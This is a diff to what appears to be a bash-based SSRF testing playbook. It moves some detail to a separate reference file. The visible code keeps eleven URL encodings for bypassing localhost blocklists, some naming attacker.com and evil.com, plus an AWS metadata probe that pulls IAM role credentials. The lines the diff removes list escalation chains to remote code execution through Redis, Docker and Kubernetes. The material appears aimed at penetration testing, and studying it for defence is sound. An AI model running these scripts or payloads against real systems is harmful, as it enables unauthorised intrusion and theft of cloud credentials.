@@ -154,26 +154,25 @@ done
 
 ### Step 4: IP bypass techniques (blocklist evasion)
 
+> **Reference**: See [REFERENCE.md](REFERENCE.md) for the full IP bypass techniques dictionary (all 11 encoding formats and the redirect chain bypass).
+
 ```bash
 echo "=== Step 4: IP Bypass Techniques ==="
 # Apply when direct 127.0.0.1 or 169.254.169.254 is blocked
+# See REFERENCE.md for all 11 bypass technique URLs
 
-# Target to bypass (use metadata IP or localhost)
-BLOCKED_IP="127.0.0.1"
-
-# All 11 bypass techniques
 declare -A BYPASSES=(
-  ["decimal"]="http://2130706433/"               # 127.0.0.1 as decimal
-  ["octal"]="http://0177.0.0.1/"                  # octal 0177 = 127
-  ["hex"]="http://0x7f.0x0.0x0.0x1/"             # hex representation
-  ["short_ip"]="http://127.1/"                    # abbreviated notation
-  ["ipv6_loopback"]="http://[::1]/"               # IPv6 loopback
-  ["ipv6_mapped"]="http://[::ffff:127.0.0.1]/"   # IPv4-mapped IPv6
-  ["ipv6_hex"]="http://[::ffff:0x7f000001]/"      # mixed hex IPv6
-  ["url_encoded"]="http://%31%32%37%2e%30%2e%30%2e%31/"  # URL-encoded
+  ["decimal"]="http://2130706433/"
+  ["octal"]="http://0177.0.0.1/"
+  ["hex"]="http://0x7f.0x0.0x0.0x1/"
+  ["short_ip"]="http://127.1/"
+  ["ipv6_loopback"]="http://[::1]/"
+  ["ipv6_mapped"]="http://[::ffff:127.0.0.1]/"
+  ["ipv6_hex"]="http://[::ffff:0x7f000001]/"
+  ["url_encoded"]="http://%31%32%37%2e%30%2e%30%2e%31/"
   ["double_encoded"]="http://%2531%2532%2537%2e%30%2e%30%2e%31/"
-  ["at_symbol"]="http://attacker.com@127.0.0.1/" # parser confusion
-  ["bracket"]="http://127.0.0.1:80#@evil.com/"   # fragment abuse
+  ["at_symbol"]="http://attacker.com@127.0.0.1/"
+  ["bracket"]="http://127.0.0.1:80#@evil.com/"
 )
 
 for technique in "${!BYPASSES[@]}"; do
@@ -194,12 +193,6 @@ for technique in "${!BYPASSES[@]}"; do
   [ "$code" = "200" ] && [ "$size" -gt 20 ] && \
     echo "  [!] BYPASS SUCCESS via $technique technique"
 done
-
-# Redirect chain bypass (external URL redirects to internal)
-echo ""
-echo "[*] Redirect chain bypass: if external URLs are allowed, use a redirect"
-echo "    Host a redirect at your server: curl http://your-server/r -> 302 -> http://169.254.169.254/"
-echo "    Then: ${PARAM}=http://your-server/r"
 ```
 
 ### Step 5: Cloud metadata exploitation
@@ -211,6 +204,9 @@ echo "=== Step 5: Cloud Metadata Exploitation ==="
 echo "[*] Detecting cloud provider..."
 curl -sk -I "$TARGET" 2>/dev/null | grep -iE "x-amz|x-goog|x-ms-|server: EC2|cloudfront|amazonaws" | head -5
 
+> **Reference**: See [REFERENCE.md](REFERENCE.md) for full cloud metadata paths (AWS, GCP, Azure) including IMDSv1/v2 notes.
+
+```bash
 # AWS IMDSv1 (no token required — most critical)
 AWS_META_IP="169.254.169.254"
 echo ""
@@ -237,7 +233,6 @@ for aws_path in \
   [ "$code" = "200" ] && [ "$size" -gt 5 ] && {
     echo "  [!] AWS METADATA ACCESSIBLE"
     cat "$OUTDIR/aws_meta.txt"
-    # If we got a role name, fetch the credentials
     if cat "$OUTDIR/aws_meta.txt" | grep -qE '^[A-Za-z]'; then
       ROLE=$(cat "$OUTDIR/aws_meta.txt" | head -1 | tr -d '[:space:]')
       echo "  [!] IAM Role found: $ROLE — fetching credentials..."
@@ -317,24 +312,12 @@ done
 
 echo ""
 echo "=== Chain Impact Assessment ==="
-cat <<'EOF'
-SSRF Impact Classification:
-  DNS callback only                        -> Informational (DO NOT report alone)
-  HTTP request to OOB host                 -> Low
-  Internal service reachable (e.g. Redis)  -> Medium
-  Admin panel or sensitive internal API    -> High
-  Cloud metadata accessible                -> High
-  Cloud IAM credentials extracted          -> Critical
-  RCE via internal service (Docker/Redis)  -> Critical
 
-Chain escalation paths:
-  SSRF + AWS IMDSv1 -> extract AccessKeyId/SecretAccessKey -> AWS API RCE
-  SSRF + internal port 2375 (Docker API) -> POST /containers/create -> RCE
-  SSRF + internal Redis -> SLAVEOF attacker.com -> write webshell -> RCE
-  SSRF + internal Elasticsearch -> dump all indices -> mass data breach
-  SSRF + internal K8s (10250) -> /exec endpoint -> RCE on pods
-EOF
+# Impact classification and chain escalation paths
+# See REFERENCE.md for full details
 ```
+
+> **Reference**: See [REFERENCE.md](REFERENCE.md) for SSRF impact classification levels and chain escalation paths (AWS, Docker, Redis, Elasticsearch, Kubernetes).
 
 ## Done when
 
